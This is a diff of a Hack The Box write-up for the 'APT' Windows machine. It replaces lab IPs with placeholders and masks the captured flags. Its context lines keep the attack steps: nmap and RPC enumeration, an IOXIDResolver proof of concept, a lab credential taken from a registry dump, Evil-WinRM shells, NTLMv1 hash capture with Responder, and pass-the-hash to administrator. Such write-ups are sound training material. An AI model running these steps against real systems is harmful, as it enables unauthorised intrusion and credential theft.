@@ -11,8 +11,6 @@ htb_url: https://app.hackthebox.com/machines/APT
 ---
 ## Overview
 
-![](https://github.com/zweilosec/htb-writeups/tree/b40bc088c8cf564cc8693f3b815c9e3b2095d693/windows-machines/insane/machine%3E.infocard.png)
-
 Short description to include any strange things to be dealt with - Windows Insane
 
 ## Useful Skills and Tools
@@ -29,11 +27,11 @@ Short description to include any strange things to be dealt with - Windows Insan
 
 ### Nmap scan
 
-I started my enumeration with an nmap scan of `10.10.10.213`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all ports, `-sC` is the equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target, `-sV` does a service scan, and `-oA <name>` saves all types of output \(.nmap,.gnmap, and .xml\) with filenames of `<name>`.
+I started my enumeration with an nmap scan of `<YOUR_IP>`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all ports, `-sC` is the equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target, `-sV` does a service scan, and `-oA <name>` saves all types of output \(.nmap,.gnmap, and .xml\) with filenames of `<name>`.
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/apt]
-└─$ nmap -sCV -n -p- -Pn -vvvv -oA apt 10.10.10.213
+└─$ nmap -sCV -n -p- -Pn -vvvv -oA apt <YOUR_IP>
 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
 
 PORT    STATE SERVICE REASON  VERSION
@@ -69,14 +67,13 @@ Most of the pages on the site did not contain anything useful or interesting. Th
 
 submitting the form redirected me to the IP I had seen that the site had been copied from \(10.13.38.16\). Burp also failed to connect
 
-
 I also could not ping that IP. This was not the way.
 
 ### Port 1135 - RPC
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/apt]
-└─$ rpcclient -I 10.10.10.213 -U "" -N apt.htb -p 135           
+└─$ rpcclient -I <YOUR_IP> -U "" -N apt.htb -p 135           
 Cannot connect to server.  Error was NT_STATUS_CONNECTION_DISCONNECTED
 ```
 
@@ -107,7 +104,7 @@ def main(argv):
         print('IOXIDResolver.py -t <target>')
         sys.exit(2)
 
-    target_ip = "10.10.10.213"
+    target_ip = "<YOUR_IP>"
 
     for opt, arg in opts:
         if opt == '-h':
@@ -143,10 +140,10 @@ I copied the PoC from the site and modified the script to scan the IP of my targ
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/apt]
-└─$ python3 IOXIDResolver.py 10.10.10.213
-[*] Retrieving network interface of 10.10.10.213
+└─$ python3 IOXIDResolver.py <YOUR_IP>
+[*] Retrieving network interface of <YOUR_IP>
 Address: apt
-Address: 10.10.10.213
+Address: <YOUR_IP>
 Address: dead:beef::b885:d62a:d679:573f
 Address: dead:beef::4d93:3f31:7ea4:6f57
 ```
@@ -329,7 +326,6 @@ Archive:  backup.zip
 ```
 
 Using this password I was able to successfully extract all of the files
-
 
 ```
 ┌──(zweilos㉿kali)-[~/htb/apt]
@@ -514,7 +510,6 @@ Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
 
 I used a bit of bash hackery to remove the results that showed failed attempts and let it run.  (I assumed it would take a long time so I let it go and got dinner)
 
-
 ** this is the way **
 *  https://github.com/byt3bl33d3r/CrackMapExec/issues/339
 ```
@@ -660,7 +655,6 @@ my errors were caused because the time was 10 minutes off...Thank you `net time`
 And it worked!!
 
 ### push on
-
 
 ```
 ┌──(zweilos㉿kali)-[~/htb/apt]
@@ -831,7 +825,6 @@ I reached the end of the file and found some minorly useful information.  I star
 
 Searching for `Password` yeilded something that I had scrolled right past in my first look through.  There was a username and password `henry.vinson_adm:G1#Ny5@2dvht`
 
-
 ## Initial Foothold
 
 ```
@@ -851,7 +844,6 @@ User Name            SID
 ==================== =============================================
 htb\henry.vinson_adm S-1-5-21-2993095098-2100462451-206186470-1106
 
-
 GROUP INFORMATION
 -----------------
 
@@ -867,7 +859,6 @@ NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandato
 NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
 Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192
 
-
 PRIVILEGES INFORMATION
 ----------------------
 
@@ -876,7 +867,6 @@ Privilege Name                Description                    State
 SeMachineAccountPrivilege     Add workstations to domain     Enabled
 SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
 SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
-
 
 USER CLAIMS INFORMATION
 -----------------------
@@ -888,24 +878,20 @@ Kerberos support for Dynamic Access Control on this device has been disabled.
 
 After all that, I finally had a shell!  There were no useful or interesting groups or privileges (adding a machine to the domain would be very useful in other situations though! I should have tried it anyway...).
 
-
 ### User.txt
 
 ```
 [0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\henry.vinson_adm\Documents> cd ../Desktop
 [0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\henry.vinson_adm\Desktop> ls
 
-
     Directory: C:\Users\henry.vinson_adm\Desktop
-
 
 Mode                LastWriteTime         Length Name
 ----                -------------         ------ ----
 -ar---        3/31/2021   3:46 PM             34 user.txt
 
-
 [0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\henry.vinson_adm\Desktop> type user.txt
-0be8b33241a64934480a8ff868aca6ca
+****
 ```
 
 I found the proof that I had made it inside, on the users Desktop
@@ -987,7 +973,7 @@ The .bat version seemed to be stuck on a loop, so I started poking around manual
                   <DhcpEnabled>false</DhcpEnabled>
                </Ipv4Settings>
                <UnicastIpAddresses>
-                  <IpAddress wcm:action="add" wcm:keyValue="1">10.10.10.86/24</IpAddress>
+                  <IpAddress wcm:action="add" wcm:keyValue="1"><YOUR_IP>/24</IpAddress>
                </UnicastIpAddresses>
                <Ipv6Settings>
                   <DhcpEnabled>true</DhcpEnabled>
@@ -997,7 +983,7 @@ The .bat version seemed to be stuck on a loop, so I started poking around manual
                   <Route wcm:action="add">
                      <Identifier>1</Identifier>
                      <Prefix>0.0.0.0/0</Prefix>
-                     <NextHopAddress>10.10.10.2</NextHopAddress>
+                     <NextHopAddress><YOUR_IP></NextHopAddress>
                   </Route>
                </Routes>
             </Interface>
@@ -1115,9 +1101,7 @@ Cannot find path 'C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2008.9
 [0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\henry.vinson_adm\Documents\test> cd "C:\ProgramData\Microsoft\Windows Defender\platform\"
 [0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\ProgramData\Microsoft\Windows Defender\platform> ls
 
-
     Directory: C:\ProgramData\Microsoft\Windows Defender\platform
-
 
 Mode                LastWriteTime         Length Name
 ----                -------------         ------ ----
@@ -1167,8 +1151,6 @@ MpCmdRun: End Time:  Thu  Apr  01  2021 22:25:24
 MpCmdRun: Command Line: "C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe" -h
 
  Start Time:  Thu  Apr  01  2021 22:28:13
-
-
 
 MpEnsureProcessMitigationPolicy: hr = 0x0
 
@@ -1247,10 +1229,8 @@ The scan failed
     Challenge set              [1122334455667788]
     Don't Respond To Names     ['ISATAP']
 
-
-
 [+] Listening for events...
-[SMB] NTLMv1 Client   : 10.10.10.213
+[SMB] NTLMv1 Client   : <YOUR_IP>
 [SMB] NTLMv1 Username : HTB\APT$
 [SMB] NTLMv1 Hash     : APT$::HTB:95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384:95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384:1122334455667788                                                          
 [*] Skipping previously captured hash for HTB\APT$
@@ -1381,7 +1361,6 @@ User Name         SID
 ================= ============================================
 htb\administrator S-1-5-21-2993095098-2100462451-206186470-500
 
-
 GROUP INFORMATION
 -----------------
 
@@ -1401,7 +1380,6 @@ HTB\Schema Admins                          Group            S-1-5-21-2993095098-
 HTB\Denied RODC Password Replication Group Alias            S-1-5-21-2993095098-2100462451-206186470-572 Mandatory group, Enabled by default, Enabled group, Local Group
 NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                  Mandatory group, Enabled by default, Enabled group
 Mandatory Label\High Mandatory Level       Label            S-1-16-12288
-
 
 PRIVILEGES INFORMATION
 ----------------------
@@ -1435,7 +1413,6 @@ SeTimeZonePrivilege                       Change the time zone                  
 SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
 SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled
 
-
 USER CLAIMS INFORMATION
 -----------------------
 
@@ -1456,21 +1433,14 @@ Make sure to use `-H` for hash, and not `-p` for password!
 [0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\Administrator\Documents> cd ../Desktop
 [0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\Administrator\Desktop> ls
 
-
     Directory: C:\Users\Administrator\Desktop
-
 
 Mode                LastWriteTime         Length Name
 ----                -------------         ------ ----
 -ar---         4/1/2021   9:35 AM             34 root.txt
 
-
 [0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\Administrator\Desktop> cat root.txt
-366c36e30001577410f0a8c5c89dbd15
+****
 ```
 
 After changing directories to the Desktop I was able to collect my proof!
-
-Thanks to [`<box_creator>`](https://www.hackthebox.eu/home/users/profile/<profile_num>) for something interesting or useful about this machine.
-
-If you like this content and would like to see more, please consider [buying me a coffee](https://www.buymeacoffee.com/zweilosec)!
